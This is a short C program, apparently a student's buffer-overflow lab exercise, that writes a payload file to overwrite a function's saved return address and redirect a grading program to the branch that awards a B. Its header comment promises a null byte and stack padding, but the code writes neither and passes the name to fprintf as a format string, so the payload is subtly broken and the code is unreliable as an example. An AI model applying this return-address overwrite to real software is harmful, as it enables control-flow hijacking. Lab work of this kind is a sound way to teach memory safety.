/*----------------------------------------------------------------------
 * createdataB.c
 * Author: Praneeth Bhandaru
 *
 * Produces a file called dataB with the student name, a nullbyte,
 * padding to overrun the stack, and the address of the instruction in
 * main to get a B, the latter of which will overwrite getName's stored
 * x30.
----------------------------------------------------------------------*/


#include <stdio.h>
#include <stdlib.h>

static const unsigned int lReturnAddress = 0x00400890;
static const char sName[] = "Chinmay Bhandaru";

int main(void) {

    FILE *psFile = fopen("dataB", "w");
    if (psFile == NULL) {
        printf("Error opening file\n");
        return 1;
    }

    fprintf(psFile, sName);
    fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);

    fclose(psFile);

    return 0;
}
